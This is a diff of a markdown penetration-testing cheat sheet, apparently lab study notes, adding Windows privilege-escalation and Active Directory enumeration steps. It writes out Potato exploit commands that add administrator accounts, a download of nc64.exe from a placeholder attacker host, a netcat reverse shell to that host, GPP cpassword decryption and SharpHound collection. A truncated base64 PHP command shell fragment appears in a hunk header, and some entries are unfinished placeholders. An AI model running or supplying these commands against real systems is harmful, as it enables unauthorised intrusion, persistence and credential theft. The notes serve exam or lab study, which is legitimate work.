@@ -903,12 +903,31 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
   - enumerate windows version and security patches
     `Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }`
   - search elevation of privileges CVE and download to target
-  - Execute the .\CVE-xxx-xxxx.exe and priviledge escalate  
-- 🖥️ **Priviledge Escalated Tool - SigmaPotato.exe**  
-  - Need "SeImpersonatePrivilege" priledge enabled
-  - `whoami /priv`  
-  - `.\SigmaPotato "net user dave4 lab /add"`
-  - `.\SigmaPotato "net localgroup Administrators dave4 /add"`  
+  - Execute the .\CVE-xxx-xxxx.exe and priviledge escalate
+- :octocat: **Privilege Escalation with "SeImpersonatePrivilege" or "SeAssignPrimaryTokenPrivilege" right**
+  `whoami /priv` 
+  - 🖥️ **SigmaPotato.exe**  
+    ```
+    .\SigmaPotato "net user dave4 lab /add
+    .\SigmaPotato "net localgroup Administrators dave4 /add"
+    ```
+  - 🖥️ **PrintSpoofer.exe**
+    `.\PrintSpoofer64.exe -i -c powershell.exe`  
+  - 🖥️ **GodPotato.exe**
+    ```
+    .\GodPotato-NET4 -cmd "net user godpotatoUser password123! /add"
+    .\GodPotato-NET4 -cmd "net localgroup Administrators godpotatoUser /add"
+
+    iwr -uri http://<kali>/nc64.exe -OutFile 'nc64.exe'
+    .\GodPotato-NET4.exe -cmd "nc64.exe -t -e C:\Windows\System32\cmd.exe <kali> 4444"
+    ```
+  
+| Exploit       | Works On                           | Privilege Required              | Command Example                                                                 |
+|---------------|------------------------------------|---------------------------------|---------------------------------------------------------------------------------|
+| **JuicyPotato** (2018) | Win7/8/10 < 1903, Server ≤ 2016 | `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` | `.\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -c {clsid}` |
+| **PrintSpoofer** (2020) | Win10 1903+, Server 2019 | `SeImpersonatePrivilege`        | `.\PrintSpoofer.exe -i -c C:\Windows\System32\cmd.exe`                                                |
+| **GodPotato** (2021)    | Win10, Server 2019+      | `SeImpersonatePrivilege`        | `.\GodPotato-NET4.exe -cmd "cmd.exe"`                                                  |
+| **SigmaPotato** (2022+) | Win10/11, Server 2016–2022 | `SeImpersonatePrivilege`        | `.\SigmaPotato.exe -i -c "C:\Windows\System32\cmd.exe"`                                               |
 
 # Linux priviledge  
 - 🖥️ **Automated Linux Enum - LinPEAS.sh**
@@ -1086,7 +1105,7 @@ Login to DC
     Get-ObjectAcl -Identity "Management Department" | Where-Object {$_.ActiveDirectoryRights -eq "GenericAll"} | Select-Object @{n='Identity';e={($_.SecurityIdentifier | Convert-SidToName)}}, ActiveDirectoryRights
 
     #Domain shares
-    Find-DomainShare
+   
     ```
   - ❗**Permissions and logged on Users**
     - enumerate all machines in the domain and check current user has local admin rights
@@ -1102,8 +1121,27 @@ Login to DC
   `net group "Management Department" stephanie /add /domain`
   `net group "Management Department" stephanie /del /domain`
 - Domain Shares
-  ``
-- BloodHound & SharpHound
+  - Find-DomainShare
+    `PS C:\Tools> Find-DomainShare`  
+  - Enumerate "SYSVOL" for policies and scripts
+    ```
+    PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\
+    PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\Policies\
+    kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"  #crack cpassword
+    ```
+  - List interesting files on shares  
+    `PS C:\Tools> ls \\FILES04\docshare`  
+- 🖥️ **BloodHound & SharpHound**
+  - Import SharpHound script to memory
+    ```
+    powershell -ep bypass
+    PS C:\Users\stephanie\Downloads> Import-Module .\Sharphound.ps1  
+    ```
+  - Extract the bloodhound json files.zip
+    `PS C:\Users\stephanie\Downloads> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"`  
+  - Start  BloodHound
+  - d
+  - dd
 
 # Lateral movement  
 - Login to DC
